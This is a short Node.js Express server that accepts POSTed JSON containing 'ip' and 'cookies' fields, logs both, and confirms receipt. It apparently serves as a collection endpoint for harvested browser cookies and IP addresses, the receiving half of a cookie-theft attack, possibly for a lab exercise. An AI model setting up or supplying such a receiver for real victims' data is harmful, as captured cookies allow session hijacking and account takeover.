const express = require("express");
const app = express();

app.use(express.json());

app.post("/", (req, res) => {
  const { ip, cookies } = req.body;
  console.log("Received IP:", ip);
  console.log("Received Cookies:", cookies);
  res.send("Data received successfully!");
});

app.listen(3000, () => {
  console.log("Server running on http://10.0.1.33:3000");
});
